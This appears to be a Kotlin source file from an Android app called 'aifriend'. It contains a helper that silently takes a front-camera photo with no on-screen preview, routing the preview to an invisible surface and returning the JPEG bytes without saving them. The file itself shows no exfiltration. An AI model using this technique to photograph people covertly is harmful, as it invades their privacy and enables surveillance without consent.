package com.aifriend.app

import android.content.Context
import android.graphics.ImageFormat
import android.graphics.SurfaceTexture
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.view.Surface

object CameraSnap {
    /** সামনের ক্যামেরায় পর্দা ছাড়াই একটা ছবি তোলে (ফোনে জমা হয় না), না পারলে null */
    @Suppress("MissingPermission")
    fun front(c: Context, cb: (ByteArray?) -> Unit) {
        val ht = HandlerThread("snap").apply { start() }
        val hd = Handler(ht.looper)
        var done = false
        var cam: CameraDevice? = null
        var reader: ImageReader? = null
        fun finish(b: ByteArray?) {
            if (done) return
            done = true
            try { cam?.close() } catch (_: Exception) {}
            try { reader?.close() } catch (_: Exception) {}
            ht.quitSafely()
            cb(b)
        }
        try {
            val cm = c.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val id = cm.cameraIdList.firstOrNull {
                cm.getCameraCharacteristics(it).get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT
            } ?: cm.cameraIdList.first()
            val rd = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2)
            reader = rd
            val tex = SurfaceTexture(0).apply { setDefaultBufferSize(640, 480) }
            val dummy = Surface(tex)
            hd.postDelayed({ finish(null) }, 8000)
            cm.openCamera(id, object : CameraDevice.StateCallback() {
                override fun onOpened(d: CameraDevice) {
                    cam = d
                    try {
                        d.createCaptureSession(listOf(dummy, rd.surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(s: CameraCaptureSession) {
                                try {
                                    val pv = d.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply { addTarget(dummy) }
                                    s.setRepeatingRequest(pv.build(), null, hd)
                                    hd.postDelayed({
                                        try {
                                            rd.setOnImageAvailableListener({ r ->
                                                val img = r.acquireLatestImage()
                                                if (img != null) {
                                                    val buf = img.planes[0].buffer
                                                    val bytes = ByteArray(buf.remaining()); buf.get(bytes); img.close()
                                                    finish(bytes)
                                                }
                                            }, hd)
                                            val st = d.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply { addTarget(rd.surface) }
                                            s.capture(st.build(), null, hd)
                                        } catch (e: Exception) { finish(null) }
                                    }, 1200)
                                } catch (e: Exception) { finish(null) }
                            }
                            override fun onConfigureFailed(s: CameraCaptureSession) { finish(null) }
                        }, hd)
                    } catch (e: Exception) { finish(null) }
                }
                override fun onDisconnected(d: CameraDevice) { cam = d; finish(null) }
                override fun onError(d: CameraDevice, e: Int) { cam = d; finish(null) }
            }, hd)
        } catch (e: Exception) { finish(null) }
    }
}
